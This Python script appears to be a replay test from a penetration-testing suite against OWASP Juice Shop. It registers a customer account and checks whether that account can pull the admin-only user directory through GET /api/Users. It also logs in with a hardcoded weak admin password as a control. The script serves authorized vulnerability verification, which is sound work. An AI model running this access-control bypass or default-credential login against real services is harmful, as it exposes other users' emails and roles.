#!/usr/bin/env python3
"""pt08: GET /api/Users requires authentication but never checks role.

Found while investigating why Juice Shop's own 'Admin Section'
scoreboard marker didn't flip for a plain customer (a frontend-only
pixel-tracking check, see README): the frontend route guard turned out
to be intact. This backend API's missing role check is a separate,
more serious bug, confirmed independently of that scoreboard check.

Checks:
1. A freshly registered customer, sent via the Authorization header
   (not the cookie, which a different, unrelated check does reject),
   gets the full user directory back, identical to what an admin sees.
2. Legitimate check: the real admin account (the weak credential pt07
   confirmed) can still list users in every condition.

Standard library only (urllib, json).
"""

from __future__ import annotations

import argparse
import json
import sys
import time
import urllib.error
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
import ledger  # noqa: E402

DEFAULT_BLUEPRINT = Path(__file__).resolve().parent / "blueprints" / "pt08-001.json"
ADMIN_EMAIL = "admin@juice-sh.op"
ADMIN_PASSWORD = "admin123"  # the weak credential pt07 confirmed; reused here only as a read oracle, not exploited further


def _login(target: str, email: str, password: str) -> str:
    req = urllib.request.Request(
        f"{target}/rest/user/login",
        data=json.dumps({"email": email, "password": password}).encode(),
        method="POST",
    )
    req.add_header("Content-Type", "application/json")
    body = json.loads(urllib.request.urlopen(req, timeout=10).read())
    return body["authentication"]["token"]


def _register_customer(target: str) -> tuple[str, str]:
    stamp = str(int(time.time() * 1000))
    email = f"pt08-{stamp}@flatline.test"
    password = "Pt08Pass123!"
    req = urllib.request.Request(
        f"{target}/api/Users",
        data=json.dumps({"email": email, "password": password, "passwordRepeat": password}).encode(),
        method="POST",
    )
    req.add_header("Content-Type", "application/json")
    urllib.request.urlopen(req, timeout=10).read()
    return _login(target, email, password), email


def _list_users(target: str, endpoint: str, token: str) -> tuple[int, dict]:
    req = urllib.request.Request(f"{target}{endpoint}", method="GET")
    req.add_header("Authorization", f"Bearer {token}")
    try:
        with urllib.request.urlopen(req, timeout=10) as resp:
            return resp.status, json.loads(resp.read())
    except urllib.error.HTTPError as exc:
        try:
            return exc.code, json.loads(exc.read())
        except Exception:
            return exc.code, {}


def run(target: str, blueprint: dict) -> dict:
    ledger.guard_target_host(target)
    endpoint = blueprint["endpoint"]

    customer_token, customer_email = _register_customer(target)
    exploit_status, exploit_body = _list_users(target, endpoint, customer_token)
    user_count = len(exploit_body.get("data", [])) if isinstance(exploit_body.get("data"), list) else 0

    if exploit_status in (401, 403):
        status = "REMEDIATED"
        summary = f"Blocked with HTTP {exploit_status}."
    elif exploit_status == 200 and user_count > 1:
        status = "VULNERABLE"
        summary = f"A plain customer listed {user_count} user accounts via the admin-only directory, including role and email for each."
    else:
        status = "ERROR"
        summary = f"Inconclusive: HTTP {exploit_status}, user_count={user_count}."

    admin_token = _login(target, ADMIN_EMAIL, ADMIN_PASSWORD)
    legit_status, legit_body = _list_users(target, endpoint, admin_token)
    legitimate_admin_access_ok = legit_status == 200 and isinstance(legit_body.get("data"), list)

    return {
        "vulnerability_id": blueprint["vulnerability_id"],
        "mitre_technique": blueprint["mitre_technique"],
        "target": target,
        "status": status,
        "exploit_http_status": exploit_status,
        "summary": summary,
        "user_count_exposed_to_customer": user_count,
        "legitimate_admin_access_ok": legitimate_admin_access_ok,
        "legitimate_admin_access_http_status": legit_status,
    }


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--blueprint", default=str(DEFAULT_BLUEPRINT))
    parser.add_argument("--target", default=None, help="Overrides the blueprint's target.host, e.g. to point at the proxy instead.")
    args = parser.parse_args()

    blueprint = json.loads(Path(args.blueprint).read_text())
    target = args.target or blueprint["target"]["host"]

    result = run(target, blueprint)
    print(json.dumps(result, indent=2))

    results_dir = Path(__file__).resolve().parent / "results"
    results_dir.mkdir(exist_ok=True)
    out_path = results_dir / f"{result['vulnerability_id']}-{int(time.time())}.json"
    out_path.write_text(json.dumps(result, indent=2))

    ledger._append_log({"event": "replay_run", "item": "pt08-missing-function-level-access-control", **result})

    if result["status"] == "ERROR":
        sys.exit(2)


if __name__ == "__main__":
    main()
